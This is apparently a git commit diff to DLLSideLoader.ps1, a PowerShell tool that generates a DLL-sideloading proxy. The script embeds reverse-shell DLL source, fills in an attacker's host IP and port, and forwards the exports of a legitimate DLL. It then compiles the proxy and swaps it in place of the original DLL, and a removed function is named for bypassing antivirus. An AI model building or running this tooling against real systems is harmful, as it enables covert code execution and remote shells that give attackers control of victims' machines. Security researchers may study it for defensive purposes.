043a38a3ded945554c92c71ba379bc32cc5af489
4ndr34z <andreas@f20.be>
2021-10-31 15:10:28 +0100

    Update DLLSideLoader.ps1

--- DLLSideLoader.ps1
+++ DLLSideLoader.ps1
@@ -1,16 +1,8 @@
-#Ripped from https://alastaircrabtree.com/how-to-find-latest-version-of-msbuild-in-powershell/
-Function Find-MsBuild()
-{
-	$buildtoolspath32 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\msbuild.exe"
-	$buildtoolspath64 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\amd64\msbuild.exe"
-	
-	
-	If (Test-Path $buildtoolspath32) { return $buildtoolspath32 } 
-	If (Test-Path $buildtoolspath64) { return $buildtoolspath64 } 
 
-    throw "Unable to find msbuild, please install Build Tools for VS 2019!!"
-}
 
+$buildtoolspath32 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe"
+$buildtoolspath64 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\amd64\MSBuild.exe"
+	
 $RevShellDLLSource = @" 
 #include "pch.h"
 #include "stdafx.h"
@@ -102,88 +94,30 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 
 "@ 
-Function Invoke-DLLSideload([string] $OriginalInDLL = "original.dll", [string] $maliciousDLL = "payload.dll")
+
+$platform =  $args[0]
+$OriginalInDLL =  $args[1]
+$HostIP =  $args[2]
+$HostPORT = $args[3]
+
+
+
+
+
+Function Invoke-DLLSideLoad($Platform, $OriginalInDLL, $HostIP, $HostPORT )
 {
-##Generate temp xml file name
-$xmlFileOut = [System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.xml'
+<#
+.SYNOPSIS
+    .
+.DESCRIPTION
+    Generate DLL-proxyfile for DLL-Sideloading
 
-##Location of the DLL source file that we will write to
-$dllSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\DLLSideLoadCompiler.cpp"
+.EXAMPLE
+    C:\PS> Invoke-DLLSideload x64 somefile.dll 192.168.1.23 443
+.NOTES
+    .    
+#>
 
-##Location of the original DLL path
-$OriginalInDLLFullPath =  [string](Get-Location) + "\" + $OriginalInDLL
-
-##Location of the DLLMain source file that we will write to
-$dllMainSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\dllmain.cpp"
-
-##The the original DLL will be named 
-$originalOutDLL = [string](Get-Location) + "\" + [string]([System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.dll')
-
-##Location of the project sln file to compile
-$dllTempSln = [string](Get-Location) + "\DLLSideLoadCompiler\DLLSideLoadCompiler.sln"
-
-##Location of output DLL when compiled 
-$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\Debug\DLLSideLoadCompiler.dll"
-
-Write-Host "[+] Dumping functions from DLL $OriginalInDLL into $xmlFileOut"
-
-#Extract DLL function calls from the supplied DLL , dump data into xml FILE
-.\dllexp.exe /from_files $OriginalInDLLFullPath  /ScanExports 1 /sxml $xmlFileOut | Out-Null
-
-Write-Host "[+] Waiting for XML file to be created"
-#Just to be sure it's done
-Start-Sleep -s 2
-
-Write-Host "[+] Backing up the and renaming the original DLL.."
-#Rename the original DLL to match the one refferd to inside the generated one
-Copy-Item -Path $OriginalInDLL -Destination $originalOutDLL
-
-Move-Item -Path $OriginalInDLL -Destination ($OriginalInDLL + ".bak")
-
-Write-Host "[+] Reading functions from XML dump"
-#Read XML data
-[xml]$xmldata = Get-Content -Path $xmlFileOut 
-
-Write-Host "[+] Clearing $dllSourceOut for old content"
-#Empty the .cpp file
-Out-File -FilePath $dllSourceOut
-
-Write-Host "[+] Parsing and writing code into $dllSourceOut"
-#Parse and print into C code
-"#include `"pch.h`" `n" | Out-File -FilePath $dllSourceOut -Append
-"#include `"stdafx.h`" `n" | Out-File -FilePath $dllSourceOut -Append
-
-"HINSTANCE hDll = LoadLibrary(L`"$([System.IO.Path]::GetFileNameWithoutExtension($maliciousDLL) + ".dll")`");`n" | Out-File -FilePath $dllSourceOut -Append
-
-$counter = 0
-$xmldata.exported_functions_list | ForEach-Object {
-	$_.item | ForEach-Object {
-		$counter++
-		"`#pragma comment(linker, `"/export:$($_.function_name)=$([System.IO.Path]::GetFileNameWithoutExtension($originalOutDLL)).$($_.function_name),`@$($counter)`")" | Out-File -FilePath $dllSourceOut -Append
-
-	}
-}
-Write-Host "[+] Writing entrypoint to dllmain.cpp"
-Out-File -FilePath $dllMainSourceOut -InputObject $MainDLLSource 
-
-Write-Host "[+] Removing the XML dump"
-#Remove the XML file, don't need it anymore
-Remove-Item -Path $xmlFileOut
-
-Write-Host "[+] Compiling proxy DLL using MSBuild from Build Tools 2019!"
-#build the project
-.$(Find-MsBuild) $dllTempSln /p:Platform=x86 | Out-Null
-
-Write-Host "[+] Moving the compiled DLL into directory"
-
-#Move the compiled DLL so it matches the originl input DLL
-Move-Item -Path $outPutDLL -Destination $OriginalInDLL
-
-}
-
-
-Function Invoke-AVBypassDLLSideLoad([string] $OriginalInDLL = "original.dll", [string] $HostIP = "127.0.0.1", [string] $HostPORT = "1337" )
-{
 
 ##Replacing IP and PORT
 $RevShellDLLSource = $RevShellDLLSource -replace "#IP#", $HostIP
@@ -208,7 +142,14 @@ $originalOutDLL = [string](Get-Location) + "\" + [string]([System.IO.Path]::GetT
 $dllTempSln = [string](Get-Location) + "\DLLSideLoadCompiler\DLLSideLoadCompiler.sln"
 
 ##Location of output DLL when compiled 
-$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\Debug\DLLSideLoadCompiler.dll"
+If ($platform -eq "x64") {
+$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\x64\Release\DLLSideLoadCompiler.dll"
+} 
+
+If ($platform -eq "x86") {
+$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\Release\DLLSideLoadCompiler.dll"
+} 
+
 
 Write-Host "[+] Dumping functions from DLL $OriginalInDLLFullPath into $xmlFileOut"
 
@@ -257,14 +198,23 @@ Write-Host "[+] Removing the temp  XML dump"
 #Remove the XML file, don't need it anymore
 Remove-Item -Path $xmlFileOut
 
-Write-Host "[+] Compiling proxy DLL using MSBuild from Build Tools 2019!"
+Write-Host "[+] Compiling proxy DLL"
 #build the project
-.$(Find-MsBuild) $dllTempSln /p:Platform=x86 | Out-Null
+If ($platform -eq "x64") {
+.$buildtoolspath64 $dllTempSln /p:Configuration=Release /p:Platform=$platform | Out-Null
+} 
+
+If ($platform -eq "x86") {
+.$buildtoolspath64 $dllTempSln /p:Configuration=Release /p:Platform=$platform | Out-Null
+} 
+
 
 Write-Host "[+] Moving the compiled DLL into directory"
 
 #Move the compiled DLL so it matches the originl input DLL
 Move-Item -Path $outPutDLL -Destination $OriginalInDLL
 
-}
+write-host "Original-dll: $originalOutDLL"
+write-host "Proxy-dll: $OriginalInDLLFullPath"
 
+}
